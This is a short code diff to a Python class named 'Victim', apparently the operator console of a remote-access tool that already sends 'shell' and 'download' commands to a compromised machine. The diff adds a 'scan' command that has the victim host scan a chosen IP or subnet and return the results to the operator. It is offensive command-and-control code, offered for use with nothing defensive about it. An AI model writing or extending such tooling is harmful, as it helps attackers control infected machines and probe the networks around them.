@@ -16,7 +16,8 @@ class Victim:
         self.commands = {
             "ping": self.__ping,
             "shell": self.__shell,
-            "download": self.__download
+            "download": self.__download,
+            "scan": self.__scan
         }
 
     def __ping(self) -> bool:
@@ -93,6 +94,22 @@ class Victim:
                 return False
         else:
             print("Error: enter a correct file name")
+        return True
+
+    def __scan(self):
+        target = input("Target IP or Network (ex: 192.168.1.0/24) : ")
+        if target:
+            self.conn.send(b"scan "+target.encode())
+            print("Waiting for scan result...")
+            buffer = self.conn.recv()
+            if buffer:
+                print("\nScan result :\n")
+                print(buffer.decode())
+            else:
+                # Lost connection
+                return False
+        else:
+            print("Enter a correct target !")
         return True
 
     def enter_shell(self) -> bool:
